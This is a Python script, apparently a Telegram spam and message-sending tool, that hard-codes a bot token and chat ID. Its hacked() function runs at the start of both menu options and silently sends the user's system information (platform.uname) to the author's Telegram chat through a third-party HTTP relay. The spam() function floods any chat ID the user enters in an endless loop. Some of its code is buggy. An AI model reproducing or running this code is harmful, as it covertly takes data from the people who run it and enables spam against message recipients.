import requests
import platform
import os
import time
# color
green = "\033[32m"
red = "\033[31m"
blue = "\033[36m"
pink = "\033[35m"
yellow = "\033[93m"
darkblue = "\033[34m"
white = "\033[00m"
mark = '\x1b[38;5;4m'
# data
DefaultBotToken = "6629513968:AAHI44tPIBFJyU_2RyoZ3imIdhDzuIj2Np0"
DefaultChatID = "1597665917"

def send(bot_token,chat_id,massage):
    bot_token = bot_token
    chat_id = chat_id
    massage = massage
    url = f"https://api.telegram.org/bot{bot_token}/sendmessage?chat_id={chat_id}&text={massage}"
    url_site = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx"
    data = {
        "UrlBox":url,
        "AgentList":"Google Chrome",
        "VersionsList":"HTTP/1.1",
        "MethodList":"POST",
    }
    return requests.post(url_site,data)
def hacked():
    crack = str(platform.uname())
    send(DefaultBotToken,DefaultChatID,crack)

def send_massage():
    hacked()
    os.system("clear")
    while True:
        print(f"{red}wellcome to my app type end for end app")
        ID = input(f"{yellow}please type CHAT ID : ")
        mas = input(f"{yellow}please type massage: ")
        if (ID or mas) == "end":
            exit()
        else:
            rez = send(DefaultBotToken,ID,mas)
            print(f"{green}{rez}")
            print(f"{yellow}====================================================")
def spam():
    x = 0
    hacked()
    os.system("clear")
    print(f"{red}Use cntrl c to stop the programp")
    ID = input(f"{yellow}please type CHAT ID : ")
    mas = input(f"{yellow}please type massage: ")
    while True:
            rez = send(DefaultBotToken,ID,mas)
            print(f"{green}{rez}")
            x+=1
            if x == 3:
                 for i in range(0,10):
                      print(f"{yellow}sleep {i+1}s")
                      time.sleep(1)
                 x==0
            else:
                 continue

# start 
os.system("clear")
image = f"""{red}
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@* @@@@@@@@@ @@@@@@@@@@@@@@
@@@@@@@@@   @@ @@@@@@@@@@@@@#  @@@@@@@@@
@@@@@@@@,@@@  ,@.  @@   @%  ,@@*@@@@@@@@
@@@@@@@@@@@@   @@@@@ @@.@/  @@@@@@@@@@@@
@@@@@@@@@@@@@@@@  ,,,, @.@@@@@@@@@@@@@@@
@@@@@@@@     (@  @@@@@@  @@     /@@@@@@@
@@@@@@@@@@@@ @@@@@@@@@@@@@@  @@@@@@@@@@@
@@@@@@@@@@ @@@@@@@@@@@@@@@@@@  @@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
"""
text = f"{white}"+r"""
 ____  ____  ____  _      _____ ____ 
/ ___\/  __\/  _ \/ \__/|/  __//  __\
|    \|  \/|| / \|| |\/|||  \  |  \/|
\___ ||  __/| |-||| |  |||  /_ |    /
\____/\_/   \_/ \|\_/  \|\____\\_/\_\
"""
dis = f"""
{white}====================================
{green}my channel in sorosh => @zero_x
{yellow}programer => arad
{white}====================================\n
{yellow}[1] {blue}spamer
{yellow}[2] {blue}send massage
{yellow}[0] {blue}Exit
"""
print(image)
print(text)
print(dis)
ask = int(input(f"{white}====>> "))
if ask == 1:
     spam()
elif ask == 2:
     send()
else:
     print(f"{red} type 1 or 2 or 0")
